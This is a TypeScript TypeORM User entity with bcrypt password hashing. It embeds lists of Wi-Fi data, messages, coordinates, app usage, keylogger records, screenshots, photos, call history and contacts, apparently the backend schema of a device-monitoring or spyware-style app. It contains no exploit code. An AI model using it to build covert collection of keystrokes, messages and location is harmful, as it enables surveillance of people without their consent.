import * as bcrypt from "bcrypt";
import { IsNotEmpty, IsString, IsEmail, MinLength } from "class-validator";
import {
    BeforeInsert,
    Column,
    Entity,
    ObjectIdColumn,
    ObjectID,
    Index
} from "typeorm";
import { toHexString } from "../../../src/lib/env";
import { Transform } from "class-transformer";
import { Wifi } from "./Wifi";
import { Message } from "./Message";
import { Coordinates } from "./Coordinates";
import { TimeOnApp } from "./TimeOnApp";
import { KeyLogger } from './KeyLogger';
import { ScreenShot } from './ScreenShot';
import { Photo } from './Photo';
import { CallHistory } from './CallHistory';
import { Contacts } from './Contacts';

@Entity()
export class User {
    public static hashPassword(password: string): Promise<string> {
        return new Promise((resolve, reject) => {
            bcrypt.hash(password, 10, (err, hash) => {
                if (err) {
                    return reject(err);
                }
                resolve(hash);
            });
        });
    }

    public static comparePassword(
        user: User,
        password: string
    ): Promise<boolean> {
        return new Promise((resolve, reject) => {
            bcrypt.compare(password, user.password, (err, res) => {
                resolve(res === true);
            });
        });
    }

    @ObjectIdColumn()
    @Transform(toHexString, { toPlainOnly: true })
    public id: ObjectID;

    @IsEmail()
    @Column()
    @Index({ unique: true })
    public email: string;

    @IsNotEmpty()
    @IsString()
    @MinLength(6)
    @Column()
    public password: string;

    @Column(type => Wifi)
    public wifiList: Wifi[];

    @Column(type => Message)
    public messageList: Message[];

    @Column(type => Coordinates)
    public coordinatesList: Coordinates[];

    @Column(type => TimeOnApp)
    public timeOnAppList: TimeOnApp[];

    @Column(type => KeyLogger)
    public keyLoggerList: KeyLogger[];

    @Column(type => ScreenShot)
    public screenShotList: ScreenShot[];

    @Column(type => Photo)
    public photoList: Photo[];

    @Column(type => CallHistory)
    public callHistoryList: CallHistory[];

    @Column(type => Contacts)
    public contacts: Contacts[];

    public toString(): string {
        return `${this.email}`;
    }

    @BeforeInsert()
    public async hashPassword(): Promise<void> {
        this.password = await User.hashPassword(this.password);
    }
}
